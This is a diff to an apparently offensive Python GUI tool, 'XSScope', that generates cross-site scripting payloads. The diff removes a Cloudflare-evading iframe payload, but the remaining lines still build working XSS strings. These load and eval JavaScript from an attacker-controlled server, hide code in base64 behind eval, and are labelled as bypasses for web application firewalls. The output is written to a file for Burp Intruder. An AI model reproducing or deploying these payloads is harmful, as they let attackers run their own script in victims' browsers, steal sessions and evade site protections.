@@ -571,7 +571,7 @@ def check_update():
 def show_payload():
     root3 = tk.Toplevel()
     root3.title("XSScope v.2.2 - All XSS Payloads")
-    root3.geometry('750x625')
+    root3.geometry('750x575')
     # root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
 
@@ -637,18 +637,6 @@ def show_payload():
     payload5 = '"><video><source onerror=eval(atob(this.id)) id=' + payload3 + '&#61;&#61;>'
     payload6 = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/xsscope.js");a.send();</script>'
     payload7 = '<script>$.getScript("//' + tcp_server + '/xsscope.js")</script>'
-    payload8 = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + \
-               list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[
-                   2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[
-                   4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[
-                   6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[
-                   8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[
-                   10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[
-                   12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[
-                   14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[
-                   16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[
-                   18] + cloudflare_bypass + list(tcp_server)[
-                   19] + cloudflare_bypass + "/" + cloudflare_bypass + "x" + cloudflare_bypass + "s" + cloudflare_bypass + "s" + cloudflare_bypass + "c" + cloudflare_bypass + "o" + cloudflare_bypass + "p" + cloudflare_bypass + "e" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
     payload9 = '">' + str(payload1)
     payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"
 
@@ -658,7 +646,7 @@ def show_payload():
     payload11 = '<object data="data:text/html;base64,' + payload1_b64 + '"></object>'
 
     # save to intruder file
-    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3_final + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final + "\n" + payload11
+    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3_final + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload9 + "\n" + payload10_final + "\n" + payload11
 
     def directory_save():
         intruder = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
@@ -745,16 +733,6 @@ def show_payload():
 
     copy_payload7 = tk.Button(main_frame11, text="Copy payload", command=copy_payload7)  # add command
     copy_payload7.grid(row=13, column=1)
-
-    payload8_text = tk.Label(main_frame11, text="Tag Payload (CloudFlare Bypassing): ")
-    payload8_text.grid(row=14, column=0)
-
-    payload8_entry = tk.Entry(main_frame11, width=76)
-    payload8_entry.insert(END, payload8)
-    payload8_entry.grid(row=15, column=0)
-
-    copy_payload8 = tk.Button(main_frame11, text="Copy payload", command=copy_payload8)  # add command
-    copy_payload8.grid(row=15, column=1)
 
     payload9_text = tk.Label(main_frame11, text="Tag Payload (AWS Bypassing): ")
     payload9_text.grid(row=16, column=0)
